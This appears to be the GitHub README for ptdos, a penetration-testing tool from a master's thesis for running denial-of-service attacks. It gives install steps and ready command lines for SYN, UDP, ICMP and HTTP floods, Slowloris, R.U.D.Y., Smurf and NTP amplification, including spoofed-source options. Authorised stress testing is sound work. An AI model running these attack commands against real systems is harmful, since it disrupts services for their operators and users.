[![Python 3.10](https://img.shields.io/badge/python-3.10-green.svg)](https://www.python.org/downloads/release/python-3100/)
[![Linux](https://img.shields.io/badge/KaliLinux-2022.1-blue.svg)](https://www.kali.org/blog/kali-linux-2022-1-release/)
[![Linux](https://img.shields.io/badge/UbuntuLinux-22.04-orange.svg)](https://discourse.ubuntu.com/t/jammy-jellyfish-release-notes/24668)
[![OSX](https://img.shields.io/badge/macOS-12.3-purple.svg)](https://developer.apple.com/documentation/macos-release-notes/macos-12_3-release-notes)

![penterepTools](https://www.penterep.com/external/penterepToolsLogo.png)

# ptdos
Application ptdos is used for creation of Denial of Service attacks. It is part of complex system Penterep Tools.

## Implemented Denial of Service attacks
### Flood DoS attacks
* ICMP Flood
* UDP Flood
* SYN Flood
* HTTP GET Flood
* HTTP POST Flood
* HTTP HEAD Flood
### Logical DoS attacks
* Ping of Death
* Slowloris
* R.U.D.Y. - Are You Down Yet?
### Amplification DoS attacks
* Smurf Attack
* NTP Amplification

## ptdos Installation
### Software Requirements
* Python 3.10+
* hping3

### OS Requirements
* Kali Linux 2021.1+
* Ubuntu 22.04+
* macOS 12.3+

### Lib requirements
* ptlibs
* requests
* validators
* impacket
* setuptools

### Installation using pip

```
$ sudo apt install python3-pip
$ sudo pip install ptdos
$ ptdos --help
```

### Cloning source code from GitHub repository
Download ptdos source code, install packages from requirements and run main file ptdos.py

```
$ git clone https://github.com/FilipKam/ptdos
$ cd ptdos
$ sudo pip install -r requirements.txt
$ cd ptdos
$ python3 ptdos.py --help
```

### Install hping3 for SYN Flood
```
$ sudo apt install hping3
```

### Add to PATH
If you cannot invoke the script in your terminal, its probably because it is not in your PATH. Fix it by running commands below.

Add to path for BASH
```bash
echo "export PATH=\"`python3 -m site --user-base`/bin:\$PATH\"" >> ~/.bashrc
source ~/.bashrc
```
Add to path for ZSH
```bash
echo "export PATH=\"`python3 -m site --user-base`/bin:\$PATH\"" >> ~/.zshhrc
source ~/.zshhrc
```

## Getting started using the ptdos 

### Usage examples
**SYN Flood**
```
$ sudo ptdos -a synflood -dst 192.168.0.80 -dp 80 -d 10 -ss
```
**UDP Flood**
```
$ ptdos -a udpflood -dst 192.168.0.80 -dp 80 -dl 128 -d 4 -st 0.001
```
**HTTP GET Flood**
```
$ ptdos -a httpgetflood -d 5 -dst "http://192.168.0.80/test/test" -st 0.001
```
**HTTP POST Flood**
```
$ ptdos -a httppostflood -d 5 -dst "http://ptsv2.com/path/example" -body "{'name':'test','age':20}" -qs "par1=val1&par2=val2" -st 0.001
```
**HTTP HEAD Flood**
```
$ ptdos -a httpheadflood -d 5 -dst "http://192.168.0.80/test/test" -st 0.001
```
**ICMP Flood**
```
$ sudo ptdos -a icmpflood -dst 192.168.0.213 -d 4 --data-length 2048 -st 0.001
```
**Smurf Attack**
```
$ sudo ptdos -a smurf -d 10 -dst 192.168.0.80 -bc 192.168.0.255
```
**Ping of Death**
```
$ sudo ptdos -a pingofdeath -d 5 -dst 192.168.0.80
```
**NTP Amplification**
```
$ sudo ptdos -a ntpampl -dst 192.168.0.80 -d 5
```
**Slowloris**
```
$ ptdos -a slowloris -d 5 -dst "http://192.168.0.80" -dp 80 -sq 10 -st 5
```
**R.U.D.Y. - Are You Dead Yet?**
```
$ ptdos -a rudy -dst "http://192.168.0.80" -dp 80 -d 5 -st 10
```

### Options
Not all options can be used with every attack. Check the help for each attack by running ptdos.py -h.
```
-a      --attack            Attack name
-d      --duration          Specify attack's duration in seconds. Default 10 seconds.
-dst    --destination       Specify destination IP, domain or url
-dp     --dstport           Specify destination port. Default 80.
-dl     --data-length       Include len random bytes as payload. Default 1024 bytes.
-ss     --spoof-source      Spoof source IP address and port with fake values
-bc     --broadcast         Specify broadcast IP address for attack amplification
-sq     --socksquant        Number of concurrent sockets opened
-st     --sleep-time        Sleep time between packets in seconds. Default 0 seconds.
-body   --body              Specify body of the request
-qs     --query-string      Specify query string of the request like "par1=val1&par2=val2"
-j      --json              Make JSON output
-v      --version           Show script version and exit
-h      --help              Show help message and exit
```


### Issues?

* [Do you have an issue? Reach me out on GitHub!](https://github.com/FilipKam/ptdos/issues "GitHub issues")

## Version History
* 0.1 - first public release as master thesis project

## License

Copyright (c) 2022 HACKER Consulting s.r.o.

ptinsearcher is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

ptinsearcher is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with ptinsearcher.  If not, see <https://www.gnu.org/licenses/>.

## Warning

You are only allowed to run the tool against the websites which
you have been given permission to pentest. We do not accept any
responsibility for any damage/harm that this application causes to your
computer, or your network. Penterep is not responsible for any illegal
or malicious use of this code. Be Ethical!
